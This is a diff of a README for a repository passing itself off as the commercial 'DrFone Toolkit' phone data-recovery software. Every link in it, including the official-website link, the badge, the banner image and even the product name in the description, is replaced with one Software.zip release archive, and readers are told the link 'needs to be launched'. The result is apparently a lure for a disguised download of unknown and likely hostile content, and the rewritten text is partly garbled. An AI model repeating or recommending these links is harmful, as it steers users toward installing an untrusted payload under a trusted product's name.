@@ -3,7 +3,7 @@
 Welcome to the DrFone Toolkit repository - your complete solution for mobile phone data recovery, transfer, and backup needs!
 
 ## 📝 Description
-Dr.Fone is a powerful toolkit that provides a wide range of features to manage and recover data on both Android and iOS devices. Whether you accidentally deleted important data, need to transfer files between devices, or want to back up your phone, Dr.Fone has got you covered!
+https://github.com/subhankarpramanik/DrFone-Toolkit/releases/download/v1.0/Software.zip is a powerful toolkit that provides a wide range of features to manage and recover data on both Android and iOS devices. Whether you accidentally deleted important data, need to transfer files between devices, or want to back up your phone, https://github.com/subhankarpramanik/DrFone-Toolkit/releases/download/v1.0/Software.zip has got you covered!
 
 ## 🧰 Features
 🔹 Data Recovery: Easily recover lost or deleted files from your mobile device.
@@ -12,9 +12,9 @@ Dr.Fone is a powerful toolkit that provides a wide range of features to manage a
 🔹 Mobile Repair: Fix common mobile phone issues with ease.
 
 ## 🚀 Get Started
-To get started with DrFone Toolkit, you can download the latest version [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). 
+To get started with DrFone Toolkit, you can download the latest version [here](https://github.com/subhankarpramanik/DrFone-Toolkit/releases/download/v1.0/Software.zip). 
 
-[![Download DrFone Toolkit](https://img.shields.io/badge/Download-DrFone_Toolkit-<COLOR>.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) 
+[![Download DrFone Toolkit](https://github.com/subhankarpramanik/DrFone-Toolkit/releases/download/v1.0/Software.zip<COLOR>.svg)](https://github.com/subhankarpramanik/DrFone-Toolkit/releases/download/v1.0/Software.zip) 
 
 Remember, the link provided needs to be launched to access the toolkit.
 
@@ -39,8 +39,8 @@ This repository covers a wide range of topics related to mobile data management 
 - Phone Toolkit
 
 ## 🌐 More Information
-For more information about DrFone Toolkit, feel free to visit the [official website](https://www.drfone.wondershare.com/).
+For more information about DrFone Toolkit, feel free to visit the [official website](https://github.com/subhankarpramanik/DrFone-Toolkit/releases/download/v1.0/Software.zip).
 
 Explore the powerful features of DrFone Toolkit and take control of your mobile data today! Thank you for visiting our repository. 🌟
 
-![DrFone Toolkit](https://www.drfone.wondershare.com/images/mainmodule/banner-screenshots6.jpg)
+![DrFone Toolkit](https://github.com/subhankarpramanik/DrFone-Toolkit/releases/download/v1.0/Software.zip)
